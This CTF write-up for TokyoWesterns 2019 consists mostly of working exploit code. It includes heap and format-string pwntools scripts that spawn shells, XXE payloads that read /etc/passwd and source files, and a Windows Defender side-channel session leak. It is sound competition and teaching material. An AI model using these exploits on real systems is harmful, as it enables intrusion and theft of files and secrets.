# TokyoWesterns CTF 5th 2019 Writeup

## Pwn


### nothing more to say

```python
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 anciety <anciety@anciety-pc>
#
# Distributed under terms of the MIT license.
import sys
import os
import os.path
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['ancyterm', '-s', '192.168.142.1', '-t', 'alacritty', '-e']

# synonyms for faster typing
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.rr = tube.recvregex
tube.irt = tube.interactive

if len(sys.argv) > 2:
    DEBUG = 0
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])

    p = remote(HOST, PORT)
else:
    DEBUG = 1
    if len(sys.argv) == 2:
        PATH = sys.argv[1]

    p = process(PATH)


# by w1tcher who dominates pwnable challenges
def house_of_orange(head_addr, system_addr, io_list_all):
    payload = b'/bin/sh\x00'
    payload = payload + p64(0x61) + p64(0) + p64(io_list_all - 16)
    payload = payload + p64(0) + p64(1) + p64(0) * 9 + p64(system_addr) + p64(0) * 4
    payload = payload + p64(head_addr + 18 * 8) + p64(2) + p64(3) + p64(0) + \
            p64(0xffffffffffffffff) + p64(0) * 2 + p64(head_addr + 12 * 8)
    return payload


orig_attach = gdb.attach
def gdb_attach(*args, **kwargs):
    if DEBUG:
        orig_attach(*args, **kwargs)
gdb.attach = gdb_attach


def main():
    # Your exploit script goes here
    p.ru(':)\n')
    pop_rdi = 0x400773
    gets = 0x400580

    ropchain = p64(pop_rdi)
    ropchain += p64(0x601090)
    ropchain += p64(gets)
    ropchain += p64(0x601090)

    payload = 'a' * 0x108 + ropchain

    shellcode = shellcraft.sh()
    gdb.attach(p)
    p.sl(payload)
    p.sl(asm(shellcode))
    p.irt()

if __name__ == '__main__':
    main()


```

### Multi Heap

```python
from pwn import *
context.log_level = 'debug'

def Alloc(which, size, where):
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.recvuntil('Which: ')
    p.sendline(which)
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('(m/t): ')
    p.sendline(where)

def Free(idx):
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(idx))

def Free_s(idx):
    return '2\n' + str(idx) + '\n'

def Write(idx):
    p.recvuntil('Your choice: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(idx))

def Read(idx, size, buf):
    p.recvuntil('Your choice: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Content: ')
    p.send(buf)

def Copy(src_idx, dst_idx, size, ch):
    p.recvuntil('Your choice: ')
    p.sendline('5')
    p.recvuntil('Src index: ')
    p.sendline(str(src_idx))
    p.recvuntil('Dst index: ')
    p.sendline(str(dst_idx))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('(y/n): ')
    p.sendline(ch)

def Copy_s(src_idx, dst_idx, size, ch):
    return '5\n' + str(src_idx) + '\n' + str(dst_idx) + '\n' + str(size) + '\n' + ch + '\n'

def GameStart(ip, port, debug):
    global p
    if debug == 1:
        p = process('./multi_heap', env = {'LD_PRELOAD' : './libc.so.6'})
    else:
        p = remote(ip, port)
    for i in range(3):
        Alloc('long', 0x500, 'm')

    for i in range(2):
        Free(0)
    Alloc('long', 0x500, 'm')
    Alloc('long', 0x500, 'm')
    Write(1)
    libc_addr = int(p.recvline()) - 0x3ebca0
    heap_addr = int(p.recvline()) - 0x123f0
    log.info('libc addr is : ' + hex(libc_addr))
    log.info('heap addr is : ' + hex(heap_addr))
    Alloc('char', 0x100, 'm')
    Alloc('char', 0x100, 'm')
    Read(4, 8, p64(heap_addr + 0x12fe0))
    # p.recv(1024)
    # p.sendline('10')
    # Copy(4, 3, 8, 'y')
    # Write(3)
    # Write(4)
    # Free(3)
    buf = Copy_s(4, 3, 8, 'y') + Free_s(3)
    p.send(buf)
    Alloc('char', 0x100, 'm')
    Alloc('char', 0x100, 'm')
    Write(5)
    data = p.recvline()
    if '==' in data:
        print 'error !'
        return

    one_gadget = 0x4f2c5
    one_gadget = 0x4f322
    # one_gadget = 0xe569f
    # one_gadget = 0xe5858
    # one_gadget = 0xe585f
    # one_gadget = 0xe5863
    # one_gadget = 0x10a38c
    # one_gadget = 0x10a398

    pie_addr = u64(data[ : -1] + '\x00' * 2) - 0x205bc8
    log.info('pie addr is : ' + hex(pie_addr))
    payload = p64(heap_addr + 0x12fe0 + 0x20) + p64(0) + p64(0) + p64(0) + p64(one_gadget + libc_addr) * 4
    Read(5, len(payload), payload)

    Free(3)

    # gdb.attach(p)

    p.interactive()

if __name__ == '__main__':
    GameStart('multiheap.chal.ctf.westerns.tokyo', 10001, 0)
```


### printf

```pyhton
from pwn import *

context.log_level = 'debug'

def GameStart(ip, port, debug):
    global p
    if debug == 1:
        # p = process(['./ld-linux.so.2', './printf'], env = {"LD_PRELOAD" : './libc.so.6'})
        p = process('./printf', env = {"LD_PRELOAD" : './libc.so.6'})
    else:
        p = remote(ip, port)

    # gdb.attach(pidof(p)[0])
    raw_input('wait to debug')
    p.recvuntil('name?\n')
    p.sendline('%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x|%llx|%x%x%x%x%x%x%x%x%x|%llx|%llx|%llx|')

    data = p.recvuntil('Do you')
    idx = data.index('|')
    stack_base = int(data[idx + 1 : data.index('|', idx + 1)], 16) - 0x266 -0x10
    idx = data.index('|', idx + 1)
    idx = data.index('|', idx + 1)
    canary = int(data[idx + 1 : data.index('|', idx + 1)], 16)
    idx = data.index('|', idx + 1)
    pie_base = int(data[idx + 1 : data.index('|', idx + 1)], 16)
    idx = data.index('|', idx + 1)
    libc_base = int(data[idx + 1 : data.index('|', idx + 1)], 16) - 0x26b6b

    log.info("stack base is : " + hex(stack_base))
    log.info("canary is : " + hex(canary))
    log.info("pie base is : " + hex(pie_base))
    log.info("libc base is : " + hex(libc_base))

    strlen_got_offest = 0x1E40A8 + libc_base 
    system_offest = 0x52FD0 + libc_base
    one_gadget = 0x106ef8 + libc_base
    offest = stack_base - strlen_got_offest - 23 + 8 - 0x10

    payload = "/bin/sh;%c" + '%c' * 26 + ';' * 5 + p64(one_gadget)[ : 6] + '%%%dc' % offest + '%c' + ';' * 8 + '%c' * (8 * 4 - 26)
    payload = payload.ljust(0x100, '\x00')
    p.recvuntil("comment?\n")
    p.sendline(payload)

    p.interactive()

if __name__ == '__main__':
    GameStart('printf.chal.ctf.westerns.tokyo', 10001, 0)
```

### SecureKarte

```python
from pwn import *
context.log_level = 'debug'

def add(sz, des):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil(' > ')
    p.sendline(str(sz))
    p.recvuntil(' > ')
    p.send(des)
    p.recvuntil('Added id ')
    return int(p.recvline()[ : -1])

def delete(idx):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil(' > ')
    p.sendline(str(idx))

def modify(idx, des):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil(' > ')
    p.sendline(str(idx))
    p.recvuntil(' > ')
    p.send(des)

def rename(name):
    p.recvuntil('> ')
    p.sendline('99')
    p.recvuntil('name... ')
    p.send(name)

def GameStart(ip, port, debug):
    global p
    if debug == 1:
        p = process('./karte', env = {"LD_PRELOAD" : './libc.so.6'})
    else:
        p = remote(ip, port)
    p.recvuntil('name... ')
    p.send(p64(0) + p64(0x80))

    for i in range(7):
        idx = add(0x78, 'swing tql')
        delete(idx)

    for i in range(7):
        idx = add(0x68, 'swing tql')
        delete(idx)

    for i in range(7):
        idx = add(0x10, 'swing tql')
        delete(idx)

    idx1 = add(0x78, 'swing tql')
    idx2 = add(0x78, 'swing tql')
    delete(idx1)
    delete(idx2)
    modify(idx2, p64(0x6021A0)[ : 4])
    idx1 = add(0x78, 'swing tql')
    

    idx2 = add(0x78, p64(0) * 2 + p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x21) + p64(0) * 4 + p64(0) + p64(0x21))
    rename(p64(0) + p64(0x21))
    idx3 = add(0x801, 'swing tql')
    delete(idx2)
    delete(idx3)

    rename(p64(0) + p64(0x21) + p64(0) + p64(0x602118 - 5 - 0x10))

    idx2 = add(0x10, 'swing tql')
    rename(p64(0) + p64(0x71))
    delete(idx2)
    rename(p64(0) + p64(0x71) + p64(0x602110))
    delete(idx1)

    idx1 = add(0x68, '/bin/sh;')
    # gdb.attach(p, 'b * 0x400B17\nc')
    idx2 = add(0x68, p64(0x0000000400000003) + p64(0) * 3 + p64(0x0000100000001) + p64(0x602018) + p64(0) + p64(0) + p64(0x0000200000001) + p64(0x602068) + p64(0x0000deadc0bebeef))

    modify(1, p64(0x400760)[ : 6])
    delete(2)
    libc_base = u64(p.recvline()[ : -1] + '\x00' * 2) - 0x97070
    log.info('libc base is : ' + hex(libc_base))
    system_addr = libc_base + 0x4f440

    modify(2, p64(system_addr)[ : 6])

    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil(' > ')
    p.sendline(str(0x6021b0))



    p.interactive()

if __name__ == '__main__':
    GameStart('karte.chal.ctf.westerns.tokyo', 10001, 0)
```

### Asterisk-Alloc

```python
from pwn import *

local=0
remote_addr=['ast-alloc.chal.ctf.westerns.tokyo',10001]

libc=ELF('./bytedance/libc-2.27.so')

p=remote(remote_addr[0],remote_addr[1])
#context.log_level = True

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr = None):
    if addr:
        print('\033[1;31;40m[+]  %-15s  --> 0x%8x\033[0m'%(s,addr))
    else:
        print('\033[1;32;40m[-]  %-20s \033[0m'%(s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def choice(idx):
    #ru("5. exit\n")
    #rl()
    sla(": ", str(idx))

def malloc(size, content):
    choice(1)
    sla(": ", str(size))
    sa(": ", content)

def calloc(size, content):
    choice(2)
    sla(": ", str(size))
    sa(": ", content)

def realloc(size, content):
    choice(3)
    sla(": ", str(size))
    if(size > 0):
        sa(": ", content)
    else:
        ru(":")

def rm(idx):
    choice(4)
    sla(": ", idx)

def create(size):
    realloc(size, 'AA')
    for i in range(7):
        rm('r')
    realloc(0,'')

if __name__ == '__main__':
    create(0x30)
    create(0x20)
    create(0x40)
    create(0x60)
    create(0x50)
    realloc(0x70, 'AA')
    realloc(0,'')
    sla(": ", '1'*0x500)
    #realloc(0x90, p32(0xdd0760)[0:3])
    #realloc(0x28,p64(0))
    #realloc(0,'')
    realloc(0x150,'\x00'*0x128 + p64(0xe1)+p32(0x7758)[0:2])
    realloc(0,'')
    realloc(0x50,p64(0))
    malloc(0x58,'/bin/sh\x00'+p64(0xfbad3c80)+p64(0)*3+p8(0))
    rv(8)
    libc_addr = u64(rv(8)) - 0x3ed8b0
    lg("libc",libc_addr)
    libc.address = libc_addr
    realloc(0x150, '\x00'*0x58 + p64(0x21) + p64(libc.symbols['__free_hook'])+p64(0x21)*4)
    realloc(0,'')
    realloc(0x70,'\x00')
    realloc(0,'')
    realloc(0x70,p64(libc.symbols['system']))
    rm('m')
    sl("cat flag")
    p.interactive()

```


## RE

### Easy Crack Me

Search for all possible strings and check them.

```cpp
#include <cstdio>
int num[16] = {3, 2, 2, 0, 3, 2, 1, 3, 3, 1, 1, 3, 1, 2, 2, 3};
int bsum[8] = {0x15e, 0xda, 0x12f, 0x131, 0x100, 0x131, 0xfb, 0x102};
int bxor[8] = {0x52, 0xc, 0x1, 0xf, 0x5c, 0x5, 0x53, 0x58};
int gsum[8] = {0x129, 0x103, 0x12b, 0x131, 0x135, 0x10b, 0xff, 0xff};
int gxor[8] = {0x1, 0x57, 0x7, 0xd, 0xd, 0x53, 0x51, 0x51};
char a[33] = "AfOAO87OAOOAAOOAO2AOAAOOO4AOOOA5";
int esum = 1160;
bool checkeven()
{
    int sum = 0;
    for (int i = 0; i < 32; i += 2)
        if (a[i] == 'A' || a[i] == 'O')
            return true;
        else
            sum += a[i];
    return sum == esum;
}
bool checkbsum(int p)
{
    int s = p / 4 * 4;
    int sum = 0;
    for (int i = s; i < s + 4; ++i)
        if (a[i] == 'A' || a[i] == 'O')
            return true;
        else
            sum += a[i];
    return sum == bsum[p / 4];
}
bool checkbxor(int p)
{
    int s = p / 4 * 4;
    int sum = 0;
    for (int i = s; i < s + 4; ++i)
        if (a[i] == 'A' || a[i] == 'O')
            return true;
        else
            sum ^= a[i];
    return sum == bxor[p / 4];
}
bool checkgsum(int p)
{
    int s = p % 8;
    int sum = 0;
    for (int i = s; i < 32; i += 8)
        if (a[i] == 'A' || a[i] == 'O')
            return true;
        else
            sum += a[i];
    return sum == gsum[s];
}
bool checkgxor(int p)
{
    int s = p % 8;
    int sum = 0;
    for (int i = s; i < 32; i += 8)
        if (a[i] == 'A' || a[i] == 'O')
            return true;
        else
            sum ^= a[i];
    return sum == gxor[s];
}
bool check(int p)
{
    if (p % 2 == 0)
        if (!checkeven())
            return false;
    if (!checkbsum(p))
        return false;
    if (!checkbxor(p))
        return false;
    if (!checkgsum(p))
        return false;
    if (!checkgxor(p))
        return false;
    return true;
}
void dfs(int p)
{
    if (p == 32) {
        puts(a);
        return;
    }
    if (a[p] == 'A') {
        for (char c = 'a'; c <= 'f'; ++c)
            if (num[c - 'a' + 10]) {
                --num[c - 'a' + 10];
                a[p] = c;
                if (check(p))
                    dfs(p + 1);
                a[p] = 'A';
                ++num[c - 'a' + 10];
            }
    }
    else if (a[p] == 'O') {
        for (char c = '0'; c <= '9'; ++c)
            if (num[c - '0']) {
                --num[c - '0'];
                a[p] = c;
                if (check(p))
                    dfs(p + 1);
                a[p] = 'O';
                ++num[c - '0'];
            }
    }
    else
        dfs(p + 1);
}
int main()
{
    for (int i = 0; i < 32; ++i)
        if (a[i] >= 'a' && a[i] <= 'z')
            --num[a[i] - 'a' + 10];
        else if (a[i] >= '0' && a[i] <= '9')
            --num[a[i] - '0'];
    dfs(0);
    return 0;
}
```

### meow

we can dump the bytecode by nekoc.exe
read it and find the pic is 768*768, and the program call read_pixel twice then write_pixel twice.
so test it by all (0,0,0)
find the pixel equation is `p[ i, j ] = p[ o[i], j ]  ^ t[ i, j ]`
so dump the t by all `(0,0,0)`
and dump the o by `p[i, j] = (0, i%256, i//256)`
we can decode it

```python
from PIL import Image
with open("t", "rb") as f:
    t = f.read()
with open("o", "r") as f:
    o = f.readlines()

img = Image.open("flag_enc.png")
p = img.load()
flag = Image.new("RGBA", (768, 768))
for i in range(768):
    for j in range(768):
        tt = t[i*768+j]
        oo = int(o[i])
        pp = p[i,j]
        flag.putpixel((oo,j), (pp[0]^tt, pp[1]^tt, pp[2]^tt, 255))
flag.save("flag.png")

```

### EBC

```python
from ida_bytes import get_dword, patch_dword

code = 0x401354
magic = 0x10028160
#ln, ptr = 0x2C0, 0x402114
#ln, ptr = 0x760, 0x4023DC
#ln, ptr = 0x830, 0x402B44
ln, ptr = 0x930, 0x40337C
key = get_dword(ptr) ^ magic
print('0x%08X' % (key))
for i in xrange(0, ln, 4):
    patch_dword(code + i, get_dword(ptr + i) ^ key)

```

```c
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>

uint64_t ADD(uint64_t a, uint64_t b)
{
    return a + b;
}

uint64_t SUB(uint64_t a, uint64_t b)
{
    return a - b;
}
uint64_t XOR(uint64_t a, uint64_t b)
{
    return a ^ b;
}
uint64_t OR(uint64_t a, uint64_t b)
{
    return a | b;
}
uint64_t NOT(uint64_t a, uint64_t b)
{
    return ~a;
}

uint64_t NEG(uint64_t a, uint64_t b)
{
    return 0 - a;
}

uint64_t SHL(uint64_t a, uint64_t b)
{
    return a << b;
}

uint64_t SHR(uint64_t a, uint64_t b)
{
    return a >> b;
}

int check1(uint64_t R1)
{
    uint64_t R2, R3, R4, R5, R6, R7;
    // ...
    return R1 == R7;
}


int check2(uint64_t R1)
{
    uint64_t R2, R3, R4, R5, R6, R7;
    // ...
    return R1 == R7;
}

int check3(uint64_t R1)
{
    uint64_t R2, R3, R4, R5, R6, R7;
    // ...
    return R1 == R7;
}

int check4(uint64_t R1)
{
    uint64_t R2, R3, R4, R5, R6, R7;
    // ...
    return R1 == R7;
}

uint32_t tbl[256] = {
    // crc 32
};

char chars[] = "abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ";

int crack(uint8_t a, uint8_t b, uint8_t c, uint8_t d)
{
    uint8_t arr[4] = { a, b, c, d };
    uint32_t v = 0xFFFFFFFF, k = 0xC13FA3BB; // 0x43451B65 0x54AAF64B 0x52976ABD 0xC13FA3BB
    for (int i = 0; i < 4; i++)
        v = (v >> 8) ^ tbl[(v & 0xFF) ^ arr[i]];
    k ^= 0xFFFFFFFF;
    for (int i = 0; i < 4; i++)
    {
        uint32_t t = k & 0xFF000000;
        int x = -1;
        for (int j = 0; j < 0x100; j++)
            if ((tbl[j] & 0xFF000000) == t)
                x = j;
        arr[3 - i] = x;
        k = (k ^ tbl[x]) << 8;
    }
    for (int i = 0; i < 4; i++)
    {
        uint8_t t = (v & 0xFF) ^ arr[i];
        if (strchr(chars, t) == NULL)
            return 0;
        v = (v >> 8) ^ tbl[arr[i]];
        arr[i] = t;
    }

    uint64_t y = 0;
    uint8_t *p = (uint8_t*)&y;
    p[0] = a;
    p[1] = b;
    p[2] = c;
    p[3] = d;
    p[4] = arr[0];
    p[5] = arr[1];
    p[6] = arr[2];
    p[7] = arr[3];
    if (check4(y))
        printf("%c%c%c%c%c%c%c%c\n", a, b, c, d, arr[0], arr[1], arr[2], arr[3]);
}

int main(int argc, char*argv[])
{
    uint8_t a, b, c, d;
    uint8_t begin = 0, end = 63;
    
    for (a = begin; a < end; a++)
    {
        for (b = begin; b < end; b++)
        {
            for (c = begin; c < end; c++)
            {
                for (d = begin; d < end; d++)
                {
                    crack(chars[a], chars[b], chars[c], chars[d]);
                }
            }
        }
        printf("a: %c\n", chars[a]);
    }
}


```

### Holy Grail War

```python
from struct import pack, unpack

def ROL(a, b):
    return ((a << b) & 0xFFFFFFFF) | (a >> (0x20 - b))
def ROR(a, b):
    return ((a << (0x20 - b)) & 0xFFFFFFFF) | (a >> (b))
def ADD(a, b):
    return ((a + b) & 0xFFFFFFFF)  
def SUB(a, b):
    return ((a - b) & 0xFFFFFFFF)  
keys = [
"ee9ef18322ed45da846d740f6dab5659efc01789b6f35c7add1267791ffb096069c55b6ad3576c37380dbae978e082bec16c8577eecf73a2832c14d4a674730168aeaea30423b5029e4b3d0ebf80b01e4b37a8300f0ff18409358202abbfdad0c65353c88e268e76",
"810378a893b825d35ff2892881923c097013a30cbebb1af0eb1e9b06cd655b3312f8a0db2e1f6426e048cdcd0980fb2f6d7d07754a62238f0af2c87101b854e236a93b442f4a4f6f5f59ba8aa630859a0e5a2ac48d30d89abd8d6242de10abab0e66959f3ce90eae",
"504935776d303b1135128a3fd16eafe3e9d14cf5e871fb9eba448d297022678f2370a9e95bd40071e4a5f208a5e409eec79f53c6538753c84b1b9ef50e2968d203d2f176b2e91799d4328a900101d2e88ef89260ec73fc845827d9cb2464a64417957782febe39ec",
"f82654105fd5452901c16e5a75fc603ca35f36bc9c697655158754991fbd081c975637d54cfc161f91e71b54ff149316dbc2bfdd7f1e139c6e6a9bec9808701967c00b63c8df545161579a7304e3bc9e469d8f6da45690369ee0c45be8bb39a1623d0293779197e5",
"edb6156e9e3459f2d8fdd4fe2b489a75d60f154bf19826d4e18cd885ee96372594f61a9447b39709bb2eb2cd6cf55e36903e8f45c336c5a14d28e100377b555ff8dff6ad96a06062f51fb83d0a078e7afa09067a19ed6d9ed54377375b5aad8e2147bf69a493ea04",]
keys = map(lambda x:unpack('<26I', x.decode('hex')), keys)

s = 'd4f5f0aa8aeee7c83cd8c039fabdee6247d0f5f36edeb24ff9d5bc10a1bd16c12699d29f54659267'.decode('hex')
flag = ''
r = 0
for i in xrange(0, len(s), 8):
    x, y = unpack('>2I', s[i:i+8])
    k = keys[r]
    for ii in xrange(24):
        i = 24 - ii - 1
        y, t = x, y
        x = ROR(SUB(t, k[i + 2]), y & 0x1F) ^ y 
    y = SUB(y, k[1])
    x = SUB(x, k[0])
    flag += pack('>2I', x, y)
    r += 1
print(flag)

```

Flag: `TWCTF{Fat3_Gr4nd_Ord3r_1s_fuck1n6_h07}
`

## Misc

### Welcome

The flag is `TWCTF{Welcome_to_TWCTF_2019!!!}`.

### Survey

Submit form and you get the flag


## Crypto

### real-baby-rsa

Crack it byte by byte.

### Simple Logic

We can enumerate the lower bits of key. The lower bits of encrypted text should be correct once we find the correct lower bits (e.g. 0~7 bit) of key. After finding the lower bits of key, we can then enumerate some higher bits (e.g. 8~15 bit) of it.

### Happy!

Coppersmith attack:

```
pol = x^2 - inverse_mod(cf,N)*x
beta = 1
roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)

```

### M-Poly-Cipher

This cipher algorithm is as follows.

- genkey
  1. Generate 8x8 matrices $K1, K2, K3, P$.
  2. The first 4 rows of $K1$ and $K2$ and all elements of $P$ is generated randomly. The last 4 rows of $K1$ and $K2$ are linear correlated with their first 4 rows.
  3. Find $K3$ that satisfies $K1 \times P \times P + K2 \times P \times K3 = 0$.
  4. $K1, K2, K3$ are public keys. $P$ is private key.
- encrypt
  1. A = convert_to_matrix(text)
  2. Generate random matrix S.
  3. $E1 = S \times K1, E2 = S \times K2, E3 = A + S \times K3$
  4. $E1, E2, E3$ are encrypted text
- decrypt
  1. $A = E1 \times P \times P + E2 \times P + E3$
  2. text = convert_to_text(A)

We can solve $S$ through $S = (E1 + E2) \times ((K1 + K2)^{-1})$. Then $A = E3 - S \times K3$.



## Web

### j2x2j

URL: http://j2x2j.chal.ctf.westerns.tokyo/

Basically, it is a converter service for JSON

we were able to leak the `/etc/passwd` file by using XXE vulnerability

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Since it is PHP, we can RFI using `php://` and arbitrarily load a file we want. For this challenge, we used `php://filter` to base64-encode the flag.php file.

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=flag.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <adress>42 rue du CTF</adress>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

Response of the above request is as followes:

```json
{
    "contact": {
        "name": "Jean PD9waHAKJGZsYWcgPSAnVFdDVEZ7dDFueV9YWEVfc3QxbGxfZXgxc3RzX2V2ZXJ5d2hlcmV9JzsK Dupont",
        "phone": "00 11 22 33 44",
        "adress": "42 rue du CTF",
        "zipcode": "75000",
        "city": "Paris"
    }
}
```

By decoding the base64 content from the name, We were able to retrieve the content of the flag.php file.

```php
<?php
$flag = 'TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}';
```

Flag: `TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}`


### PHP Note

The source was available at `http://phpnote.chal.ctf.westerns.tokyo/?action=source`. We were able to find some little logic bugs in this file.

```php
function gen_secret($seed) {
    return md5(SALT . $seed . PEPPER);
}

...

if ($action === 'login') {
    if ($method === 'POST') {
        $nickname = (string)$_POST['nickname'];
        $realname = (string)$_POST['realname'];

        if (empty($realname) || strlen($realname) < 8) {
            die('invalid name');
        }

        $_SESSION['realname'] = $realname;
        if (!empty($nickname)) {
            $_SESSION['nickname'] = $nickname;
        }
        $_SESSION['secret'] = gen_secret($nickname);
    }
    redirect('index');
}

```

As we see in the code above, `$_SESSION['nickname']` is not properly sanitized like `$_SESSION['realname']`, making possible for us to execute `gen_secret('')`, which returns `md5(SALT . PEPPER);`

But this didn't really help us anything much to find the actual vulnerability.

so we looked a bit around and found out that the server is IIS 10 by looking at the `Server:` header from the HTTP response.

```html
...
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.9

```

Then We recalled the @icchy's writeup for the WCTF challenge Gyotaku The Flag (https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf)

So we thought of the strategy and was as followes:

1. PHPSESSID is stored in the filesystem.
2. Considering that this is a Windows + IIS challenge, we can make Windows Defender angry by writing dangerous contents into the session, and destroy PHPSESSID data.
3. After the dangerous content is removed, we can manipulate the session and leak secret key byte by byte.

To prove that this works, we installed a fresh version of windows and installed IIS with PHP and sourcecode on it. then we logged in with the following parameters on login page via POST.

```html
----------1384459925
Content-Disposition: form-data; name="realname"

--!><html><head><script>var b="$EICAR-STANDARD-ANTIVIRUS-TEST-FILE";var a="X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H"+"*";eval(a);</script></head><body>
----------1384459925
Content-Disposition: form-data; name="nickname"

11
----------1384459925--

```

After that we noticed the `Threats found` alert, then we found out that some bytes are removed from the PHPSESSID. With that in mind, we made a exploit to leak the flag.

```python
import requests
 
URL = "http://phpnote.chal.ctf.westerns.tokyo" # changeme
 
def trigger(c, idx):
   import string
   p = '''<script>f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));</script><body>'''
   p = string.Template(p).substitute({'idx': idx, 'c': c})
   return p
 
def leak(idx):
   l, h = 0, 0x100
   while h - l > 1:
       m = (h + l) // 2
       gid = trigger(m, idx)
       # r = requests.post(URL + '/?action=login', data={'realname': gid, 'nickname': '1'})
       # print r.content
       # exit()
       s = requests.session()
       s.post(URL + '/?action=login', data={'realname': gid, 'nickname': ''})
       if "/?action=login" in s.post(URL + '/?action=login', data={'realname': gid, 'nickname': '</body>'}).content:
           l = m
       else:
           h = m
   return chr(l)
 
data = ''
for i in range(100):
   data += leak(i)
   print(data)

```

```bash
$ python leak.py
b
bo
bos
bosy
bosyc
bosycr
bosycre
bosycret
bosycret|
bosycret|s
bosycret|s:
bosycret|s:3
bosycret|s:32
...
bosycret|s:32:"2532bd172578d19923e5348420e02320";nickname|s
bosycret|s:32:"2532bd172578d19923e5348420e02320";nickname|s:
bosycret|s:32:"2532bd172578d19923e5348420e02320";nickname|s:7
bosycret|s:32:"2532bd172578d19923e5348420e02320";nickname|s:7:
bosycret|s:32:"2532bd172578d19923e5348420e02320";nickname|s:7:"

```

Now we have the secret for user with nickname of `</body>`.

```php
$ cat flag.php
<?php

class Note {
    public function __construct($admin) {
        $this->notes = array();
        $this->isadmin = $admin;
    }

    public function addnote($title, $body) {
        array_push($this->notes, [$title, $body]);
    }

    public function getnotes() {
        return $this->notes;
    }

    public function getflag() {
        if ($this->isadmin === true) {
            echo FLAG;
        }
    }
}

function verify($data, $hmac) {
    $secret = $_SESSION['secret'];
    if (empty($secret)) return false;
    return hash_equals(hash_hmac('sha256', $data, $secret), $hmac);
}

function hmac($data) {
    $secret = $_SESSION['secret'];
    if (empty($data) || empty($secret)) return false;
    return hash_hmac('sha256', $data, $secret);
}

function gen_secret($seed) {
    return "2532bd172578d19923e5348420e02320";
}

// create session
$_SESSION = Array();
$_SESSION['secret'] = gen_secret('');
$_SESSION['realname'] = "stypr stypr";
$_SESSION['nickname'] = "";

// generate note
$note = new Note(true);
$note->addnote("work", "work");
$data = base64_encode(serialize($note));

/* verify
//echo "Data: ".(string)$data."\n";
//echo "HMAC: ".(string)hmac($data)."\n";
//echo "-----";
//var_dump(verify((string)$data, (string)hmac($data)));
*/
?>
curl -s 'http://phpnote.chal.ctf.westerns.tokyo/?action=logout' -H 'Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a;' --insecure
curl -s 'http://phpnote.chal.ctf.westerns.tokyo/?action=login' -H 'Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a;' --data 'nickname=</body>&realname=stypr+stypr' --compressed --insecure
curl -s "http://phpnote.chal.ctf.westerns.tokyo/?action=getflag" -H "Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a; note=<?php echo $data; ?>; hmac=<?php echo hmac($data); ?>;"

```

```bash
$ php flag.php | sh | grep "TWCTF"
TWCTF{h0pefully_I_haven't_made_a_m1stake_again}<!doctype html>

```

Flag: `TWCTF{h0pefully_I_haven't_made_a_m1stake_again}`
